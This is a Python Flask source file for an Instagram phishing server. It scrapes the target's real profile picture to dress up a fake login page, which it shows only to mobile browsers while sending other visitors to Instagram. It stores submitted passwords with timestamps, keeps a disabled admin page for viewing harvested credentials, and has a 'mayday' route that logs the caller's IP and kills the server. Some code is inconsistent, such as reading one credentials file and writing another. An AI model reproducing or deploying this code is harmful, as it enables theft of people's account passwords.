from flask import Flask, request, redirect, render_template
from os.path import exists
from datetime import datetime
from json import loads, dumps
from bs4 import BeautifulSoup
import requests
import os

app = Flask(__name__)

if not exists('password.txt'):
    with open('password.txt', 'w') as file:
        file.write("password")

if not exists('database.json'):
    with open('database.json', 'w') as file:
        file.write("[]")

def get_pfp(username):
    base_url = f"https://www.instagram.com/{username}/"
    
    response = requests.get(base_url)

    pfp = "https://upload.wikimedia.org/wikipedia/commons/a/ac/Default_pfp.jpg"
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        meta_tag = soup.find("meta", property="og:image")
        
        if meta_tag:
            pfp = meta_tag["content"]
        
    return pfp

@app.errorhandler(404)
def page_not_found(e):
    return redirect('https://www.instagram.com/404')

@app.route('/')
def index():
    return redirect('https://www.instagram.com')

@app.route('/<backend>')
def login(backend):
    with open('database.json', 'r') as file:
            data = loads(
                file.read()
            )

    if backend not in data:
        return redirect('https://www.instagram.com/404') 
    
    user_agent = request.headers.get('User-Agent')
    
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
        username = data[backend]["username"]

        pfp = get_pfp(username)
        
        return render_template("login.html", username=username, pfp=pfp)
        
    return redirect('https://www.instagram.com/404')   

@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        data = request.form

        backend = data.get('backend')
        password = data.get('password')

        with open('creds.json', 'r') as file:
            data = loads(
                file.read()
            )

        if backend not in data:
            return redirect('https://www.instagram.com/404')  

        data[backend]["password"] = password
        data[backend]["submit_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open('database.json', 'w') as file:
            file.write(
                dumps(
                    data,
                    indent=4
                )
            )

        url = data[backend]["url"]

        return redirect(url)
    
    return redirect('https://www.instagram.com/404')  

# @app.route('/admin/<password>')
# def view(password):
#     with open("password.txt", "r") as file:
#         real_password = file.read()

#     if password == real_password:
#         with open('creds.json', "r") as file:
#             data = loads(
#                 file.read()
#             )

#         return render_template('admin.html', users=data)
    
#     return redirect('https://www.instagram.com/404') 

@app.route('/new/<password>')
def new():
    return render_template("new.html", url=request.url_root)

@app.route('/mayday')
def mayday():
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("mayday.txt", "w") as file:
        file.write(f"{date} - {request.remote_addr}")

    print(f"{date} - MAYDAY !!! - {request.remote_addr}")

    os._exit(0)

if __name__ == '__main__':
    app.run()
